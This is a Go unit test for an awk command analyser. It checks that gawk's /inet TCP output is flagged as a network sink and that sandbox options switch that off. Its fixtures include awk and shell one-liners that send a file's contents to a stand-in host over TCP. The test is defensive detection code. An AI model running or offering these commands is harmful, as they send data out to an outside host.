// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package awkprog

import "testing"

// A plain awk is GNU awk on RHEL, Fedora and Amazon Linux, so its /inet
// output reads as the network sink gawk opens, with the same mode
// exclusions; mawk keeps the file reading (rel-1-0-10:GAP-2205).
func TestGAP2205AwkReadsGawkInetSink(t *testing.T) {
	const constant = `BEGIN{print "x" > "/inet/tcp/0/relay.example.test/80"}`
	const record = `{print > "/inet/tcp/0/relay.example.test/80"}`
	for _, program := range []string{"awk", "/usr/bin/awk", "gawk"} {
		got := (Call{Words: []string{program, constant}}).Read()
		if got.Body != `: > '/dev/tcp/relay.example.test/80'` || !got.NetworkSink || got.NetworkRecordFlow {
			t.Errorf("%s constant output reading %+v", program, got)
		}
		got = (Call{Words: []string{program, record, "notes.txt"}}).Read()
		if got.Body != `cat 'notes.txt' > '/dev/tcp/relay.example.test/80'` || !got.NetworkSink || !got.NetworkRecordFlow {
			t.Errorf("%s record output reading %+v", program, got)
		}
		for _, option := range []string{"--sandbox", "-S", "--posix", "-P", "--traditional", "--compat", "-c"} {
			got := (Call{Words: []string{program, option, record, "notes.txt"}}).Read()
			if got.NetworkSink || got.NetworkRecordFlow {
				t.Errorf("%s %s gained a network sink: %+v", program, option, got)
			}
		}
	}
	for _, program := range []string{"mawk", "nawk"} {
		if got := (Call{Words: []string{program, constant}}).Read(); got.Body != `: > '/inet/tcp/0/relay.example.test/80'` || got.NetworkSink {
			t.Errorf("%s reading %+v changed", program, got)
		}
	}
}
